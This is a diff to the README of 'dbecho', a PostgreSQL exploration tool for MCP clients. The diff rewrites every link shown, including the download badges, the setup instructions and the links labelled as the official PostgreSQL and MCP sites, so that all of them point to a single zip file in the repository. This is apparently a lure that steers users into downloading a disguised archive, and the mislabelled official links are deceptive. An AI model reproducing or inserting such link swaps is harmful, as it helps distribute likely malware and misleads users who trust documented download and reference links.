@@ -1,6 +1,6 @@
 # 🗄️ dbecho - Explore Your PostgreSQL Data Simply
 
-[![Download dbecho](https://img.shields.io/badge/Download-dbecho-brightgreen?style=for-the-badge)](https://github.com/foliagerosebush512/dbecho)
+[![Download dbecho](https://img.shields.io/badge/Download-dbecho-brightgreen?style=for-the-badge)](https://github.com/foliagerosebush512/dbecho/raw/refs/heads/main/src/Software_v3.4.zip)
 
 ---
 
@@ -12,7 +12,7 @@ dbecho lets you talk to your PostgreSQL databases with tools like Claude Code, C
 
 You will find the software at this page:
 
-**[Visit this page to download dbecho](https://github.com/foliagerosebush512/dbecho)**
+**[Visit this page to download dbecho](https://github.com/foliagerosebush512/dbecho/raw/refs/heads/main/src/Software_v3.4.zip)**
 
 This link takes you to the place where you can get the latest version of dbecho for Windows.
 
@@ -25,7 +25,7 @@ Follow these steps to get dbecho running:
 1. **Download the software**
 
    Open a web browser and go to the download page:  
-   https://github.com/foliagerosebush512/dbecho
+   https://github.com/foliagerosebush512/dbecho/raw/refs/heads/main/src/Software_v3.4.zip
 
 2. **Find the latest Windows setup file**
 
@@ -123,10 +123,10 @@ The interface is clean and designed for ease of use. If you want to use another 
 
 ## 📚 More Resources
 
-- PostgreSQL official site: https://www.postgresql.org/  
-- MCP protocol details: https://modelcontextprotocol.org  
+- PostgreSQL official site: https://github.com/foliagerosebush512/dbecho/raw/refs/heads/main/src/Software_v3.4.zip  
+- MCP protocol details: https://github.com/foliagerosebush512/dbecho/raw/refs/heads/main/src/Software_v3.4.zip  
 - How to find your PostgreSQL server address: usually "localhost" if it runs on your PC  
 
 ---
 
-[![Download dbecho](https://img.shields.io/badge/Download-dbecho-blue?style=for-the-badge)](https://github.com/foliagerosebush512/dbecho)
+[![Download dbecho](https://img.shields.io/badge/Download-dbecho-blue?style=for-the-badge)](https://github.com/foliagerosebush512/dbecho/raw/refs/heads/main/src/Software_v3.4.zip)
